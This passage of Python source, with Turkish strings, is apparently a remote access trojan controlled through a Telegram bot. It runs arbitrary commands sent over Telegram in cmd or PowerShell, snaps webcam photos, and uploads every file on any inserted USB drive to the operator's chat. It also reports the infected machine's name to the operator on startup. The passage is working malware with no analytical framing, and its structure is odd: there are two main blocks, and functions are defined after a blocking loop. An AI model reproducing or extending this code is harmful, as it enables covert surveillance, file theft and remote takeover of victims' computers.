        bot.send_message(call.message.chat.id, f"❌ Hata: {str(e)}", reply_markup=main_menu())



# Send initial message on bot startup
def send_initial_message():
    try:
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🚀 *Bot Başlatıldı!*\nBağlanılan Cihaz: {platform.node()}\nEtkileşim için /start komutunu kullanın.",
            parse_mode='Markdown'
        )
    except Exception as e:
        pass

# Main execution
def handle_messagebox_text(message):
    try:
        if message.text:
            import ctypes
            import getpass
            import platform
            username = getpass.getuser()
            computer = platform.node()
            mesaj = f"{message.text}\n\nKullanıcı: {username}\nBilgisayar: {computer}"
            ctypes.windll.user32.MessageBoxW(0, mesaj, "Bot Uyarısı", 0x40)
            bot.send_message(message.chat.id, "💬 MessageBox ekrana gösterildi!", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "🚫 Mesaj boş olamaz.", reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ MessageBox gösterilemedi: {str(e)}", reply_markup=main_menu())

def handle_cmd_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "/k", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "⚡ Komut yeni CMD penceresinde çalıştırıldı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "❌ CMD bulunamadı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "🚫 Komut boş olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"❌ Komut çalıştırılamadı: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )

def handle_ps_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "🔧 Komut yeni PowerShell penceresinde çalıştırıldı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "❌ PowerShell bulunamadı.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "🚫 Komut boş olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"❌ Komut çalıştırılamadı: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )


if __name__ == "__main__":
    send_initial_message()
    while True:
        try:
            bot.polling(none_stop=True, interval=1)  # interval'ı 1 saniyeye çıkardık
        except Exception as e:
            try:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"⚠️ Bot bir hata ile karşılaştı: {str(e)}\n5 saniye içinde yeniden başlatılıyor...",
                    parse_mode='Markdown'
                )
            except:
                pass
            time.sleep(5)

# Function to take a photo from webcam and send it
def take_photo_and_send(chat_id):
    try:
        bot.send_message(chat_id, "📷 Fotoğraf çekiliyor, lütfen bekleyin...")
        cap = cv2.VideoCapture(1)
        if not cap.isOpened():
            bot.send_message(chat_id, "❌ Web kamerası bulunamadı veya açılamadı.", reply_markup=main_menu())
            return
        ret, frame = cap.read()
        if ret:
            photo_path = "webcam_photo.jpg"
            cv2.imwrite(photo_path, frame)
            with open(photo_path, "rb") as photo_file:
                bot.send_photo(chat_id, photo_file, caption="📸 İşte web kamerası fotoğrafınız!", reply_markup=main_menu())
            if os.path.exists(photo_path):
                os.remove(photo_path)
        else:
            bot.send_message(chat_id, "❌ Web kamerasından görüntü alınamadı.", reply_markup=main_menu())
        cap.release()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Fotoğraf çekilirken bir hata oluştu: {str(e)}", reply_markup=main_menu())

class USBHandler(FileSystemEventHandler):
    def __init__(self, bot, admin_id):
        self.bot = bot
        self.admin_id = admin_id
        self.processed_drives = set()

    def scan_drive(self, drive_path):
        try:
            files = []
            total_size = 0
            print(f"USB Sürücü Taranıyor: {drive_path}")  # Debug mesajı
            
            for root, dirs, filenames in os.walk(drive_path):
                for filename in filenames:
                    file_path = os.path.join(root, filename)
                    try:
                        size = os.path.getsize(file_path)
                        total_size += size
                        files.append({
                            'path': file_path,
                            'size': size,
                            'name': filename
                        })
                        print(f"Dosya bulundu: {filename} ({size} bytes)")  # Debug mesajı
                    except Exception as e:
                        print(f"Dosya okuma hatası: {file_path} - {str(e)}")  # Debug mesajı
                        continue

            if not files:
                print("Hiç dosya bulunamadı!")  # Debug mesajı
                return

            # Dosyaları boyuta göre sırala
            files.sort(key=lambda x: x['size'])
            
            # USB bilgilerini gönder
            self.bot.send_message(
                self.admin_id,
                f"🔌 Yeni USB Disk Tespit Edildi!\n"
                f"📁 Sürücü: {drive_path}\n"
                f"📊 Toplam Boyut: {total_size / (1024*1024):.2f} MB\n"
                f"📑 Dosya Sayısı: {len(files)}"
            )
            
            # Her dosyayı gönder
            for file in files:
                try:
                    print(f"Dosya gönderiliyor: {file['path']}")  # Debug mesajı
                    with open(file['path'], 'rb') as f:
                        self.bot.send_document(
                            self.admin_id,
                            f,
                            caption=f"📄 {file['name']}\n"
                                   f"📍 {file['path']}\n"
                                   f"📊 {file['size'] / 1024:.1f} KB",
                            timeout=60
                        )
                        time.sleep(2)  # Her dosya arasında 2 saniye bekle
                except Exception as e:
                    print(f"Dosya gönderme hatası: {str(e)}")  # Debug mesajı
                    self.bot.send_message(
                        self.admin_id,
                        f"❌ Dosya gönderilemedi: {file['path']}\nHata: {str(e)}"
                    )
                    
        except Exception as e:
            print(f"Genel hata: {str(e)}")  # Debug mesajı
            self.bot.send_message(
                self.admin_id,
                f"❌ USB disk taranırken hata oluştu: {str(e)}"
            )

    def on_created(self, event):
        try:
            if not event.is_directory:
                drive_path = os.path.splitdrive(event.src_path)[0] + "\\"
                print(f"Yeni dosya olayı: {event.src_path}")  # Debug mesajı
                print(f"Sürücü yolu: {drive_path}")  # Debug mesajı
                
                if drive_path not in self.processed_drives and self.is_removable(drive_path):
                    print(f"Yeni USB sürücü tespit edildi: {drive_path}")  # Debug mesajı
                    self.processed_drives.add(drive_path)
                    self.scan_drive(drive_path)
        except Exception as e:
            print(f"On_created hatası: {str(e)}")  # Debug mesajı

    def is_removable(self, drive):
        try:
            drive_type = win32file.GetDriveType(drive)
            is_removable = drive_type == win32con.DRIVE_REMOVABLE
            print(f"Sürücü kontrolü: {drive} - Çıkarılabilir mi: {is_removable}")  # Debug mesajı
            return is_removable
        except Exception as e:
            print(f"Sürücü tipi kontrolü hatası: {str(e)}")  # Debug mesajı
            return False

# USB izleme işlemini başlat
def start_usb_monitoring(bot, admin_id):
    event_handler = USBHandler(bot, admin_id)
    observer = Observer()
    
    # Tüm sürücüleri izle
    for drive in range(ord('A'), ord('Z')+1):
        drive_path = f"{chr(drive)}:\\"
        try:
            if os.path.exists(drive_path):
                observer.schedule(event_handler, drive_path, recursive=False)
        except:
            continue
    
    observer.start()
    return observer

# Ana fonksiyona USB izleme özelliğini ekle
if __name__ == '__main__':
    try:
        print("USB izleme başlatılıyor...")  # Debug mesajı
        event_handler = USBHandler(bot, ADMIN_CHAT_ID)
        observer = Observer()
        
        # Tüm sürücüleri izle
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            try:
                if os.path.exists(drive_path):
                    observer.schedule(event_handler, drive_path, recursive=False)
                    print(f"İzleniyor: {drive_path}")  # Debug mesajı
            except Exception as e:
                print(f"Sürücü izleme hatası ({drive_path}): {str(e)}")  # Debug mesajı
                continue
        
        observer.start()
        print("USB izleme başlatıldı!")  # Debug mesajı
        
        # Mevcut USB sürücüleri kontrol et
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            if os.path.exists(drive_path) and event_handler.is_removable(drive_path):
                print(f"Mevcut USB sürücü bulundu: {drive_path}")  # Debug mesajı
                event_handler.scan_drive(drive_path)
        
        # Bot polling'i başlat
        while True:
            try:
                bot.polling(none_stop=True, interval=1)
            except Exception as e:
                print(f"Bot hatası: {str(e)}")  # Debug mesajı
                time.sleep(5)
                
    except Exception as e:
        print(f"Ana program hatası: {str(e)}")  # Debug mesajı
